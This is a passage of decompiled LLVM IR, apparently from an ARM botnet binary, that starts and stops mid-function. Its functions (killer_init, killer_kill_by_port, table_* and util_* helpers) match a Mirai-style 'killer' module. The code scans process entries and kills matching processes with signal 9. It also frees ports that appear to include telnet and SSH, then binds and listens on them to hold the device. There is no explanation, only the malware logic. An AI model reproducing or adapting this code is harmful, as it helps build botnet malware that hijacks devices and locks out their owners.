  %v2_cd1c = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cd20 = load i32, i32* @r7, align 4
  %v1_cd24 = load i32, i32* @sl, align 4
  %v2_cd24 = add i32 %v1_cd24, %v2_cd1c
  store i32 %v2_cd24, i32* @r0, align 4
  %v2_cd28 = inttoptr i32 %v2_cd24 to i8*
  %v3_cd28 = call i32 @util_strcpy(i8* %v2_cd28, i32 %v0_cd20)
  %v2_cd30 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cd34 = load i32, i32* @r5, align 4
  store i32 %v2_cd30, i32* @r4, align 4
  %v2_cd40 = inttoptr i32 %v0_cd34 to i32*
  %v3_cd40 = call i32 @table_retrieve_val(i32 17, i32* %v2_cd40)
  %v0_cd48 = load i32, i32* @r4, align 4
  %v1_cd48 = load i32, i32* @sl, align 4
  %v2_cd48 = add i32 %v1_cd48, %v0_cd48
  store i32 %v2_cd48, i32* @r0, align 4
  %v2_cd4c = inttoptr i32 %v2_cd48 to i8*
  %v3_cd4c = call i32 @util_strcpy(i8* %v2_cd4c, i32 %v3_cd40)
  %v1_cd54 = call i32 @__GI_opendir(i32 %v2_ca00)
  store i32 %v1_cd54, i32* @r8, align 4
  %v2_cd58 = icmp eq i32 %v1_cd54, 0
  br i1 %v2_cd58, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cd60.preheader

dec_label_pc_cd60.preheader:                      ; preds = %dec_label_pc_cd00
  %v1_cd6438 = inttoptr i32 %v1_cd54 to i32*
  %v2_cd6439 = call i32 @__GI_readdir(i32* %v1_cd6438)
  store i32 %v2_cd6439, i32* @r6, align 4
  %v2_cd6841 = icmp eq i32 %v2_cd6439, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_cd6841, label %dec_label_pc_ce68, label %dec_label_pc_cd78thread-pre-split

dec_label_pc_cd60.loopexit:                       ; preds = %dec_label_pc_cd80, %dec_label_pc_ce18
  %v0_cd60 = load i32, i32* @r8, align 4
  %v1_cd64 = inttoptr i32 %v0_cd60 to i32*
  %v2_cd64 = call i32 @__GI_readdir(i32* %v1_cd64)
  store i32 %v2_cd64, i32* @r6, align 4
  %v2_cd68 = icmp eq i32 %v2_cd64, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_cd68, label %dec_label_pc_ce68, label %dec_label_pc_cd78thread-pre-split

dec_label_pc_cd78thread-pre-split:                ; preds = %dec_label_pc_cd60.preheader, %dec_label_pc_cd60.loopexit
  %v0_cd78.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_cd78

dec_label_pc_cd78:                                ; preds = %dec_label_pc_cd78thread-pre-split, %dec_label_pc_ce40
  %v0_cd78 = phi i32 [ %v0_cd78.pr, %dec_label_pc_cd78thread-pre-split ], [ 1, %dec_label_pc_ce40 ]
  %v2_cd78 = icmp eq i32 %v0_cd78, 0
  br i1 %v2_cd78, label %dec_label_pc_cd80, label %dec_label_pc_ce68

dec_label_pc_cd80:                                ; preds = %dec_label_pc_cd78
  %v0_cd80 = call i32 @util_zero()
  %v0_cd84 = load i32, i32* @r5, align 4
  %v2_cd8c = inttoptr i32 %v0_cd84 to i32*
  %v3_cd8c = call i32 @table_retrieve_val(i32 15, i32* %v2_cd8c)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_cd98 = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cd8c)
  %v2_cda0 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cda4 = load i32, i32* @r7, align 4
  %v1_cda8 = load i32, i32* @sl, align 4
  %v2_cda8 = add i32 %v1_cda8, %v2_cda0
  store i32 %v2_cda8, i32* @r0, align 4
  %v2_cdac = inttoptr i32 %v2_cda8 to i8*
  %v3_cdac = call i32 @util_strcpy(i8* %v2_cdac, i32 %v0_cda4)
  %v2_cdb4 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cdb8 = load i32, i32* @r5, align 4
  store i32 %v2_cdb4, i32* @r4, align 4
  %v2_cdc4 = inttoptr i32 %v0_cdb8 to i32*
  %v3_cdc4 = call i32 @table_retrieve_val(i32 17, i32* %v2_cdc4)
  %v0_cdcc = load i32, i32* @r4, align 4
  %v1_cdcc = load i32, i32* @sl, align 4
  %v2_cdcc = add i32 %v1_cdcc, %v0_cdcc
  store i32 %v2_cdcc, i32* @r0, align 4
  %v2_cdd0 = inttoptr i32 %v2_cdcc to i8*
  %v3_cdd0 = call i32 @util_strcpy(i8* %v2_cdd0, i32 %v3_cdc4)
  %v2_cdd8 = call i32 @util_strlen(i8* %v3_ca24)
  %v1_cde0 = load i32, i32* @sl, align 4
  %v2_cde0 = add i32 %v1_cde0, %v2_cdd8
  store i32 %v2_cde0, i32* @r0, align 4
  %v2_cde4 = inttoptr i32 %v2_cde0 to i8*
  %v3_cde4 = call i32 @util_strcpy(i8* %v2_cde4, i32 ptrtoint (i32* @global_var_19ac8.73 to i32))
  %v2_cdec = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cdf0 = load i32, i32* @r6, align 4
  %v1_cdf0 = add i32 %v0_cdf0, 11
  %v1_cdf4 = load i32, i32* @sl, align 4
  %v2_cdf4 = add i32 %v1_cdf4, %v2_cdec
  store i32 %v2_cdf4, i32* @r0, align 4
  %v2_cdf8 = inttoptr i32 %v2_cdf4 to i8*
  %v3_cdf8 = call i32 @util_strcpy(i8* %v2_cdf8, i32 %v1_cdf0)
  %v3_ce08 = call i32 @readlink(i32 %v2_ca00, i32 %v2_c9f0, i32 4096)
  %v7_ce0c = icmp eq i32 %v3_ce08, -1
  br i1 %v7_ce0c, label %dec_label_pc_cd60.loopexit, label %dec_label_pc_ce18

dec_label_pc_ce18:                                ; preds = %dec_label_pc_cd80
  %v2_ce18 = call i32 @util_strlen(i8* %v3_ca10)
  store i32 %v2_ce18, i32* @r1, align 4
  %v4_ce2c = call i32 @util_stristr(i8* %v3_ca10, i32 %v2_ce18, i32 %v2_cc3c.pre-phi)
  %v7_ce30 = icmp eq i32 %v4_ce2c, -1
  br i1 %v7_ce30, label %dec_label_pc_cd60.loopexit, label %dec_label_pc_ce40

dec_label_pc_ce40:                                ; preds = %dec_label_pc_ce18
  %v0_ce38 = load i32, i32* @r7, align 4
  %v2_ce40 = inttoptr i32 %v0_ce38 to i8*
  %v3_ce40 = call i32 @util_atoi(i8* %v2_ce40, i32 10)
  %v2_ce48 = call i32 @kill(i32 %v3_ce40, i32 9)
  %v0_ce4c = load i32, i32* @r8, align 4
  %v1_ce50 = inttoptr i32 %v0_ce4c to i32*
  %v2_ce50 = call i32 @__GI_readdir(i32* %v1_ce50)
  store i32 %v2_ce50, i32* @r6, align 4
  %v2_ce54 = icmp eq i32 %v2_ce50, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_ce54, label %dec_label_pc_ce68, label %dec_label_pc_cd78

dec_label_pc_ce68:                                ; preds = %dec_label_pc_cd60.loopexit, %dec_label_pc_ce40, %dec_label_pc_cd78, %dec_label_pc_cd60.preheader
  %v0_ce68 = load i32, i32* @r8, align 4
  %v1_ce6c = inttoptr i32 %v0_ce68 to i32*
  %v2_ce6c = call i32 @__GI_closedir(i32* %v1_ce6c)
  %v0_ce70 = load i32, i32* @sb, align 4
  %v1_ce74 = inttoptr i32 %v0_ce70 to i32*
  %v2_ce74 = call i32 @__GI_readdir(i32* %v1_ce74)
  %v2_ce78 = icmp eq i32 %v2_ce74, 0
  br i1 %v2_ce78, label %dec_label_pc_ce80, label %dec_label_pc_cc7c

dec_label_pc_ce80:                                ; preds = %dec_label_pc_cc6c.loopexit, %dec_label_pc_ce68, %dec_label_pc_cc7c, %dec_label_pc_cc6c.preheader
  %v0_ce80 = load i32, i32* @sb, align 4
  %v1_ce84 = inttoptr i32 %v0_ce80 to i32*
  %v2_ce84 = call i32 @__GI_closedir(i32* %v1_ce84)
  %v0_ce88 = load i32, i32* @r5, align 4
  %v1_ce88 = urem i32 %v0_ce88, 256
  br label %dec_label_pc_ce8c

dec_label_pc_ce8c:                                ; preds = %dec_label_pc_cc4c, %dec_label_pc_ce80
  %storemerge = phi i32 [ %v1_ce88, %dec_label_pc_ce80 ], [ 0, %dec_label_pc_cc4c ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ce90 = call i32 @sleep(i32 1)
  %v1_ce98 = call i32 @table_lock_val(i32 15)
  %v1_cea0 = call i32 @table_lock_val(i32 16)
  %v1_cea8 = call i32 @table_lock_val(i32 17)
  br label %dec_label_pc_ceac

dec_label_pc_ceac:                                ; preds = %bb, %dec_label_pc_ceec, %dec_label_pc_ce8c
  %v0_ceac = load i32, i32* @r4, align 4
  store i32 %v3_c9a8, i32* @r4, align 4
  store i32 %v6_c9a8, i32* @r5, align 4
  store i32 %v9_c9a8, i32* @r6, align 4
  store i32 %v12_c9a8, i32* @r7, align 4
  store i32 %v15_c9a8, i32* @r8, align 4
  store i32 %v18_c9a8, i32* @sb, align 4
  store i32 %v21_c9a8, i32* @sl, align 4
  store i32 %v24_c9a8, i32* @fp, align 4
  store i32 %v27_c9a8, i32* @lr, align 4
  ret i32 %v0_ceac

dec_label_pc_cec0:                                ; preds = %dec_label_pc_cba0
  %v1_cec0 = add i32 %v0_cec0, 1
  %v7_cec4 = icmp eq i32 %v0_cec0, 0
  br i1 %v7_cec4, label %dec_label_pc_cecc, label %dec_label_pc_cba8

dec_label_pc_cecc:                                ; preds = %dec_label_pc_cec0
  %v1_cecc = add i32 %v0_cbb0, 3
  %v2_cecc = inttoptr i32 %v1_cecc to i8*
  %v3_cecc = load i8, i8* %v2_cecc, align 1
  %v7_ced0 = icmp eq i8 %v3_cecc, 65
  br i1 %v7_ced0, label %dec_label_pc_cee4, label %dec_label_pc_ced8

dec_label_pc_ced8:                                ; preds = %dec_label_pc_cecc, %dec_label_pc_cee4
  %v0_cbb882 = phi i32 [ %v0_cbb883, %dec_label_pc_cecc ], [ 1, %dec_label_pc_cee4 ]
  br label %dec_label_pc_cb80.backedge

dec_label_pc_cb80.backedge:                       ; preds = %dec_label_pc_ced8, %dec_label_pc_cbac
  %v0_cbb881 = phi i32 [ %v0_cbb882, %dec_label_pc_ced8 ], [ %v0_cbb883, %dec_label_pc_cbac ]
  %v0_cec073 = phi i32 [ %v1_cec0, %dec_label_pc_ced8 ], [ %v0_cbac, %dec_label_pc_cbac ]
  %v0_cba0.pr70 = phi i32 [ 0, %dec_label_pc_ced8 ], [ %v0_cba0.pr71, %dec_label_pc_cbac ]
  %v0_cb80 = add i32 %v0_cbb0, 1
  %v1_cb80 = add i32 %v0_cbb0, 3
  %v2_cb80 = inttoptr i32 %v1_cb80 to i8*
  %v3_cb80 = load i8, i8* %v2_cb80, align 1
  %v4_cb80 = zext i8 %v3_cb80 to i32
  store i32 %v4_cb80, i32* @r3, align 4
  %v2_cb84 = icmp eq i8 %v3_cb80, 0
  %v1_cb88 = add i32 %v0_cb8878, 1
  br i1 %v2_cb84, label %dec_label_pc_cbb8, label %dec_label_pc_cb90

dec_label_pc_cee4:                                ; preds = %dec_label_pc_cecc
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_ced8

dec_label_pc_ceec:                                ; preds = %dec_label_pc_cc30
  %v1_cef0 = call i32 @table_lock_val(i32 15)
  %v1_cef8 = call i32 @table_lock_val(i32 16)
  %v1_cf00 = call i32 @table_lock_val(i32 17)
  %v1_cf08 = call i32 @table_lock_val(i32 19)
  br label %dec_label_pc_ceac

dec_label_pc_cf10:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_ca54

; uselistorder directives
  uselistorder i32 %v1_cb88, { 1, 0 }
  uselistorder i32 %v4_cb80, { 1, 0 }
  uselistorder i32 %v0_cbb881, { 1, 0 }
  uselistorder i32 %v1_cec0, { 1, 0 }
  uselistorder i32 %v2_ce74, { 1, 0 }
  uselistorder i32 %v1_cbe4, { 1, 0 }
  uselistorder i32 %v0_cbf030, { 1, 0 }
  uselistorder i32 %v1_cc08, { 0, 3, 1, 2 }
  uselistorder i32 %v0_cbac, { 1, 0 }
  uselistorder i32 %v0_cb8878, { 1, 0 }
  uselistorder i32 %v0_cec0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_cbb883, { 1, 2, 0 }
  uselistorder i32 %v1_cb8854, { 1, 0 }
  uselistorder i32 %v2_cb6c, { 1, 0 }
  uselistorder i32 %v1_cb68, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_cb28, { 0, 2, 1 }
  uselistorder i32 %v0_cb2816, { 1, 0 }
  uselistorder i32 %v1_caf4, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v2_ca84, { 1, 2, 0 }
  uselistorder i32 %v0_ca2c, { 1, 0 }
  uselistorder i32 %v2_ca28, { 1, 0, 2 }
  uselistorder i8* %v3_ca10, { 1, 0, 2 }
  uselistorder i32 %v2_c9f0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_ced8, { 1, 0 }
  uselistorder label %dec_label_pc_ceac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ce8c, { 1, 0 }
  uselistorder label %dec_label_pc_ce80, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ce68, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cd78, { 1, 0 }
  uselistorder label %dec_label_pc_cd78thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_cd60.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_cc7c, { 1, 0 }
  uselistorder label %dec_label_pc_cc7c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cc6c.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cc04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb90, { 1, 0 }
  uselistorder label %dec_label_pc_cb34, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ca98.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_cae8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_cab0, { 1, 0 }
  uselistorder label %dec_label_pc_ca54, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-8416 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-4264 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %v3_cf3c = load i32, i32* @r4, align 4
  %v6_cf3c = load i32, i32* @r5, align 4
  %v9_cf3c = load i32, i32* @r6, align 4
  %v12_cf3c = load i32, i32* @r7, align 4
  %v15_cf3c = load i32, i32* @r8, align 4
  %v18_cf3c = load i32, i32* @sb, align 4
  %v21_cf3c = load i32, i32* @sl, align 4
  %v24_cf3c = load i32, i32* @fp, align 4
  %v27_cf3c = load i32, i32* @lr, align 4
  %v2_cf4c = call i32 @__GI_time(i32* null)
  store i32 %v2_cf4c, i32* @r7, align 4
  %v0_cf54 = call i32 @__libc_fork()
  %v7_cf58 = icmp eq i32 %v0_cf54, -1
  %. = zext i1 %v7_cf58 to i32
  %tmp251 = icmp slt i32 %v0_cf54, 1
  %storemerge212 = select i1 %tmp251, i32 %., i32 1
  store i32 %storemerge212, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_24f80.71 to i32), i32* %r3.global-to-local, align 4
  %v2_cf74 = icmp eq i32 %storemerge212, 0
  store i32 %v0_cf54, i32* @global_var_24f80.71, align 4
  br i1 %v2_cf74, label %dec_label_pc_cf90, label %dec_label_pc_cf80

dec_label_pc_cf80:                                ; preds = %dec_label_pc_d2a4, %dec_label_pc_d188, %entry
  %v1_cf8c = phi i32 [ %v2_d240, %dec_label_pc_d188 ], [ %v0_cf54, %entry ], [ 0, %dec_label_pc_d2a4 ]
  store i32 %v3_cf3c, i32* @r4, align 4
  store i32 %v6_cf3c, i32* @r5, align 4
  store i32 %v9_cf3c, i32* @r6, align 4
  store i32 %v12_cf3c, i32* @r7, align 4
  store i32 %v15_cf3c, i32* @r8, align 4
  store i32 %v18_cf3c, i32* @sb, align 4
  store i32 %v21_cf3c, i32* @sl, align 4
  store i32 %v24_cf3c, i32* @fp, align 4
  store i32 %v27_cf3c, i32* @lr, align 4
  ret i32 %v1_cf8c

dec_label_pc_cf90:                                ; preds = %entry
  %v2_cf90 = ptrtoint i32* %stack_var_-256 to i32
  store i32 %v2_cf90, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-80, align 4
  %v1_cfa8 = call i32 @killer_kill_by_port(i32 58811)
  store i32 -6725, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_cfc0 = load i32, i32* @r5, align 4
  store i32 %v0_cfc0, i32* %r2.global-to-local, align 4
  %v3_cfc8 = call i32 @socket(i32 2, i32 1, i32 %v0_cfc0)
  %v7_cfcc = icmp eq i32 %v3_cfc8, -1
  store i32 %v3_cfc8, i32* @r4, align 4
  br i1 %v7_cfcc, label %dec_label_pc_cff4, label %dec_label_pc_cfd8

dec_label_pc_cfd8:                                ; preds = %dec_label_pc_cf90
  %v2_cfdc = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_cfdc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_cfe4 = call i32 @bind(i32 %v3_cfc8, i32 %v2_cfdc, i32 16)
  %v0_cfe8 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_cff0 = call i32 @listen(i32 %v0_cfe8, i32 1)
  br label %dec_label_pc_cff4

dec_label_pc_cff4:                                ; preds = %dec_label_pc_cf90, %dec_label_pc_cfd8
  %v2_cffc = call i32 @killer_kill_by_port(i32 ptrtoint ([3 x i8]* @global_var_c707.75 to i32))
  store i32 -14585, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d014 = load i32, i32* @r5, align 4
  store i32 %v0_d014, i32* %r2.global-to-local, align 4
  %v3_d01c = call i32 @socket(i32 2, i32 1, i32 %v0_d014)
  %v7_d020 = icmp eq i32 %v3_d01c, -1
  store i32 %v3_d01c, i32* @r4, align 4
  br i1 %v7_d020, label %dec_label_pc_d048, label %dec_label_pc_d02c

dec_label_pc_d02c:                                ; preds = %dec_label_pc_cff4
  %v2_d030 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d030, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d038 = call i32 @bind(i32 %v3_d01c, i32 %v2_d030, i32 16)
  %v0_d03c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d044 = call i32 @listen(i32 %v0_d03c, i32 1)
  br label %dec_label_pc_d048

dec_label_pc_d048:                                ; preds = %dec_label_pc_cff4, %dec_label_pc_d02c
  %v1_d050 = call i32 @killer_kill_by_port(i32 34254)
  store i32 -31282, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d068 = load i32, i32* @r5, align 4
  store i32 %v0_d068, i32* %r2.global-to-local, align 4
  %v3_d070 = call i32 @socket(i32 2, i32 1, i32 %v0_d068)
  %v7_d074 = icmp eq i32 %v3_d070, -1
  store i32 %v3_d070, i32* @r4, align 4
  br i1 %v7_d074, label %dec_label_pc_d09c, label %dec_label_pc_d080

dec_label_pc_d080:                                ; preds = %dec_label_pc_d048
  %v2_d084 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d084, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d08c = call i32 @bind(i32 %v3_d070, i32 %v2_d084, i32 16)
  %v0_d090 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d098 = call i32 @listen(i32 %v0_d090, i32 1)
  br label %dec_label_pc_d09c

dec_label_pc_d09c:                                ; preds = %dec_label_pc_d048, %dec_label_pc_d080
  %v1_d0a4 = call i32 @killer_kill_by_port(i32 42448)
  store i32 -23088, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d0bc = load i32, i32* @r5, align 4
  store i32 %v0_d0bc, i32* %r2.global-to-local, align 4
  %v3_d0c4 = call i32 @socket(i32 2, i32 1, i32 %v0_d0bc)
  %v7_d0c8 = icmp eq i32 %v3_d0c4, -1
  store i32 %v3_d0c4, i32* @r4, align 4
  br i1 %v7_d0c8, label %dec_label_pc_d0f0, label %dec_label_pc_d0d4

dec_label_pc_d0d4:                                ; preds = %dec_label_pc_d09c
  %v2_d0d8 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d0d8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d0e0 = call i32 @bind(i32 %v3_d0c4, i32 %v2_d0d8, i32 16)
  %v0_d0e4 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d0ec = call i32 @listen(i32 %v0_d0e4, i32 1)
  br label %dec_label_pc_d0f0

dec_label_pc_d0f0:                                ; preds = %dec_label_pc_d09c, %dec_label_pc_d0d4
  %v1_d0f4 = call i32 @killer_kill_by_port(i32 5632)
  store i32 %v2_cf90, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d108 = load i32, i32* @r5, align 4
  store i32 %v0_d108, i32* %r2.global-to-local, align 4
  %v3_d110 = call i32 @socket(i32 2, i32 1, i32 %v0_d108)
  %v7_d114 = icmp eq i32 %v3_d110, -1
  store i32 %v3_d110, i32* @r4, align 4
  br i1 %v7_d114, label %dec_label_pc_d13c, label %dec_label_pc_d120

dec_label_pc_d120:                                ; preds = %dec_label_pc_d0f0
  %v2_d124 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d124, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d12c = call i32 @bind(i32 %v3_d110, i32 %v2_d124, i32 16)
  %v0_d130 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d138 = call i32 @listen(i32 %v0_d130, i32 1)
  br label %dec_label_pc_d13c

dec_label_pc_d13c:                                ; preds = %dec_label_pc_d0f0, %dec_label_pc_d120
  %v1_d140 = call i32 @killer_kill_by_port(i32 5888)
  store i32 %v2_cf90, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d154 = load i32, i32* @r5, align 4
  store i32 %v0_d154, i32* %r2.global-to-local, align 4
  %v3_d15c = call i32 @socket(i32 2, i32 1, i32 %v0_d154)
  %v7_d160 = icmp eq i32 %v3_d15c, -1
  store i32 %v3_d15c, i32* @r4, align 4
  br i1 %v7_d160, label %dec_label_pc_d188, label %dec_label_pc_d16c

dec_label_pc_d16c:                                ; preds = %dec_label_pc_d13c
  %v2_d170 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d170, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d178 = call i32 @bind(i32 %v3_d15c, i32 %v2_d170, i32 16)
  %v0_d17c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d184 = call i32 @listen(i32 %v0_d17c, i32 1)
  br label %dec_label_pc_d188

dec_label_pc_d188:                                ; preds = %dec_label_pc_d13c, %dec_label_pc_d16c
  %v1_d18c = call i32 @sleep(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_d194 = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_22460.77 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24f7c.79 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_d194, i32* %r2.global-to-local, align 4
  %v0_d1a4 = load i32, i32* @r5, align 4
  %v1_d1a4 = trunc i32 %v0_d1a4 to i8
  %v3_d1a4 = inttoptr i32 %v0_d194 to i8*
  store i8 %v1_d1a4, i8* %v3_d1a4, align 1
  %v0_d1ac = load i32, i32* @r5, align 4
  %v1_d1ac = load i32, i32* %r3.global-to-local, align 4
  %v2_d1ac = inttoptr i32 %v1_d1ac to i32*
  store i32 %v0_d1ac, i32* %v2_d1ac, align 4
  %v0_d1b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_d1b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_d1b0 = inttoptr i32 %v1_d1b0 to i32*
  store i32 %v0_d1b0, i32* %v2_d1b0, align 4
  %v1_d1b4 = call i32 @table_unlock_val(i32 15)
  %v1_d1bc = call i32 @table_unlock_val(i32 16)
  %v2_d1c4 = ptrtoint i32* %stack_var_-4264 to i32
  store i32 %v2_d1c4, i32* %r2.global-to-local, align 4
  %v0_d1c8 = load i32, i32* @r5, align 4
  store i32 %v0_d1c8, i32* %r1.global-to-local, align 4
  %v2_d1d4 = inttoptr i32 %v0_d1c8 to i32*
  %v3_d1d4 = call i32 @table_retrieve_val(i32 15, i32* %v2_d1d4)
  %v1_d1dc = add i32 %v2_d1c4, -56
  store i32 %v1_d1dc, i32* %r3.global-to-local, align 4
  store i32 %v3_d1d4, i32* %r1.global-to-local, align 4
  store i32 %v1_d1dc, i32* @r0, align 4
  %v2_d1ec = inttoptr i32 %v1_d1dc to i8*
  %v3_d1ec = call i32 @util_strcpy(i8* %v2_d1ec, i32 %v3_d1d4)
  %v2_d1f4 = add i32 %v3_d1ec, %v1_d1dc
  store i32 %v2_d1f4, i32* @r4, align 4
  %v1_d1f8 = call i32 @__getpid(i32 %v3_d1ec)
  %v2_d200 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_d200, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_d208 = trunc i32 %v1_d1f8 to i8
  %v4_d208 = call i32 @util_itoa(i8 %v3_d208, i32 10, i32 %v2_d200)
  store i32 %v4_d208, i32* %r1.global-to-local, align 4
  %v0_d210 = load i32, i32* @r4, align 4
  store i32 %v0_d210, i32* @r0, align 4
  %v2_d214 = inttoptr i32 %v0_d210 to i8*
  %v3_d214 = call i32 @util_strcpy(i8* %v2_d214, i32 %v4_d208)
  %v0_d218 = load i32, i32* @r5, align 4
  store i32 %v0_d218, i32* %r1.global-to-local, align 4
  %v1_d21c = load i32, i32* @r4, align 4
  %v2_d21c = add i32 %v1_d21c, %v3_d214
  store i32 %v2_d21c, i32* @r4, align 4
  %v2_d224 = inttoptr i32 %v0_d218 to i32*
  %v3_d224 = call i32 @table_retrieve_val(i32 16, i32* %v2_d224)
  store i32 %v3_d224, i32* %r1.global-to-local, align 4
  %v0_d22c = load i32, i32* @r4, align 4
  store i32 %v0_d22c, i32* @r0, align 4
  %v2_d230 = inttoptr i32 %v0_d22c to i8*
  %v3_d230 = call i32 @util_strcpy(i8* %v2_d230, i32 %v3_d224)
  %v0_d234 = load i32, i32* @r5, align 4
  store i32 %v0_d234, i32* %r1.global-to-local, align 4
  store i32 %v3_d230, i32* @r6, align 4
  %v2_d240 = call i32 @__libc_open(i32 %v1_d1dc, i32 %v0_d234)
  %v7_d244 = icmp eq i32 %v2_d240, -1
  br i1 %v7_d244, label %dec_label_pc_cf80, label %dec_label_pc_d24c

dec_label_pc_d24c:                                ; preds = %dec_label_pc_d188
  %v1_d24c = call i32 @__GI___libc_close(i32 %v2_d240)
  %v1_d254 = call i32 @table_lock_val(i32 15)
  %v1_d25c = call i32 @table_lock_val(i32 16)
  store i32 ptrtoint (i32* @global_var_24f7c.79 to i32), i32* %r3.global-to-local, align 4
  %v2_d268 = load i32, i32* @global_var_24f7c.79, align 4
  store i32 %v2_d268, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d274 = call i32 @readlink(i32 %v1_d1dc, i32 %v2_d268, i32 4095)
  %v7_d278 = icmp eq i32 %v3_d274, -1
  br i1 %v7_d278, label %.thread9, label %bb254

bb254:                                            ; preds = %dec_label_pc_d24c
  %v3_d280 = load i32, i32* @global_var_24f7c.79, align 4
  store i32 %v3_d280, i32* %r3.global-to-local, align 4
  %v1_d284 = load i32, i32* @r5, align 4
  %v2_d284 = trunc i32 %v1_d284 to i8
  %v5_d284 = add i32 %v3_d280, %v3_d274
  %v6_d284 = inttoptr i32 %v5_d284 to i8*
  store i8 %v2_d284, i8* %v6_d284, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_d24c, %bb254
  store i32 %v1_d1dc, i32* @r0, align 4
  %v0_d28c = load i32, i32* @r6, align 4
  %v1_d28c = load i32, i32* @r4, align 4
  %v1_d1dc.neg = sub i32 56, %v2_d1c4
  %v2_d28c = add i32 %v1_d1dc.neg, %v0_d28c
  %v2_d290 = add i32 %v2_d28c, %v1_d28c
